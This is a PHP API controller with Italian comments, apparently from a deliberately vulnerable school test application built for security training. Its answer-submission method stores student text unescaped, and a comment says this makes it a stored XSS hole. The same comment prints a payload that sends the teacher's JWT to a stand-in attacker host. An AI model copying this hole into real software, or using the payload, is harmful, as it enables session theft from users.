<?php

require_once __DIR__ . '/../helpers/jwt.php';
require_once __DIR__ . '/../Models/Verifiche.php';
require_once __DIR__ . '/../Models/Utenti.php';

class VerificheController {

    /**
     * GET /api/verifiche
     *  - Studente: vede le verifiche della propria classe
     *  - Professore: vede le verifiche da lui create
     */
    public function lista(): void {
        $auth = richiediAuth();
        $model = new Verifiche();
        if (($auth['ruolo'] ?? '') === 'professore') {
            echo json_encode($model->listByProfessore((int) $auth['sub']));
        } else {
            $classe = (string) ($auth['classe'] ?? '');
            echo json_encode($model->listByClasse($classe));
        }
    }

    /**
     * GET /api/verifiche/:id
     * Restituisce verifica + domande + (per lo studente) sue risposte già salvate.
     */
    public function dettaglio(int $id): void {
        $auth = richiediAuth();
        $model = new Verifiche();
        $verifica = $model->getById($id);
        if (!$verifica) {
            http_response_code(404);
            echo json_encode(['message' => 'Verifica non trovata']);
            return;
        }

        if (($auth['ruolo'] ?? '') === 'studente') {
            if (($auth['classe'] ?? '') !== $verifica['classe']) {
                http_response_code(403);
                echo json_encode(['message' => 'Verifica non destinata alla tua classe']);
                return;
            }
        } else {
            if ((int) $auth['sub'] !== (int) $verifica['professore_id']) {
                http_response_code(403);
                echo json_encode(['message' => 'Non sei il proprietario della verifica']);
                return;
            }
        }

        $domande = $model->getDomande($id);
        $risposte = [];
        if (($auth['ruolo'] ?? '') === 'studente') {
            $risposte = $model->getRisposteStudente($id, (int) $auth['sub']);
        }

        echo json_encode([
            'verifica' => $verifica,
            'domande'  => $domande,
            'risposte_studente' => $risposte,
        ]);
    }

    /**
     * POST /api/verifiche - solo professori.
     * Body: { materia_id, classe, titolo, descrizione, domande: [string, ...] }
     */
    public function crea(): void {
        $auth = richiediAuth(['professore']);
        $body = json_decode(file_get_contents('php://input'), true);
        if (!is_array($body)) {
            http_response_code(400);
            echo json_encode(['message' => 'Body JSON non valido']);
            return;
        }
        $materiaId = isset($body['materia_id']) ? (int) $body['materia_id'] : 0;
        $classe    = trim((string) ($body['classe'] ?? ''));
        $titolo    = trim((string) ($body['titolo'] ?? ''));
        $descr     = trim((string) ($body['descrizione'] ?? ''));
        $domande   = $body['domande'] ?? [];

        if ($materiaId <= 0 || $classe === '' || $titolo === '' || !is_array($domande) || count($domande) === 0) {
            http_response_code(400);
            echo json_encode(['message' => 'Campi obbligatori: materia_id, classe, titolo, almeno una domanda']);
            return;
        }

        // Il prof deve insegnare quella materia in quella classe.
        $utenti = new Utenti();
        $materie = $utenti->getMaterieInsegnate((int) $auth['sub'], $classe);
        $ok = false;
        foreach ($materie as $m) {
            if ((int) $m['id'] === $materiaId) {
                $ok = true;
                break;
            }
        }
        if (!$ok) {
            http_response_code(403);
            echo json_encode(['message' => 'Non insegni questa materia in questa classe']);
            return;
        }

        $model = new Verifiche();
        $id = $model->create((int) $auth['sub'], $materiaId, $classe, $titolo, $descr ?: null, $domande);
        http_response_code(201);
        echo json_encode(['message' => 'Verifica creata', 'id' => $id]);
    }

    /**
     * POST /api/verifiche/:id/risposte - solo studenti.
     * Body: { risposte: { "<domanda_id>": "<testo>" , ... } }
     *
     * ATTENZIONE: il testo viene salvato così com'è (NESSUN escaping/sanitizing).
     * Lato professore, la pagina di review lo renderizza con innerHTML
     * => Stored XSS. Payload dimostrativo:
     *   <img src=x onerror="fetch('http://attaccante/?t='+localStorage.getItem('jwt'))">
     */
    public function consegna(int $verificaId): void {
        $auth = richiediAuth(['studente']);
        $body = json_decode(file_get_contents('php://input'), true);
        if (!is_array($body) || !isset($body['risposte']) || !is_array($body['risposte'])) {
            http_response_code(400);
            echo json_encode(['message' => 'Formato risposte non valido']);
            return;
        }

        $model = new Verifiche();
        $verifica = $model->getById($verificaId);
        if (!$verifica) {
            http_response_code(404);
            echo json_encode(['message' => 'Verifica non trovata']);
            return;
        }
        if (($auth['classe'] ?? '') !== $verifica['classe']) {
            http_response_code(403);
            echo json_encode(['message' => 'Verifica non destinata alla tua classe']);
            return;
        }

        $domandeAmmesse = array_column($model->getDomande($verificaId), 'id');
        $domandeAmmesse = array_map('intval', $domandeAmmesse);

        $salvate = 0;
        foreach ($body['risposte'] as $domandaId => $testo) {
            $domandaId = (int) $domandaId;
            if (!in_array($domandaId, $domandeAmmesse, true)) {
                continue;
            }
            $testo = (string) $testo;
            // ⚠️ Salviamo il testo così com'è: vulnerabile a Stored XSS
            $model->salvaRisposta($domandaId, (int) $auth['sub'], $testo);
            $salvate++;
        }

        echo json_encode([
            'message'  => 'Risposte salvate',
            'salvate'  => $salvate,
        ]);
    }

    /**
     * GET /api/verifiche/:id/risposte - solo professore proprietario.
     */
    public function risposte(int $verificaId): void {
        $auth = richiediAuth(['professore']);
        $model = new Verifiche();
        $verifica = $model->getById($verificaId);
        if (!$verifica) {
            http_response_code(404);
            echo json_encode(['message' => 'Verifica non trovata']);
            return;
        }
        if ((int) $auth['sub'] !== (int) $verifica['professore_id']) {
            http_response_code(403);
            echo json_encode(['message' => 'Non sei il proprietario della verifica']);
            return;
        }
        echo json_encode([
            'verifica' => $verifica,
            'risposte' => $model->getRisposteVerifica($verificaId),
        ]);
    }
}
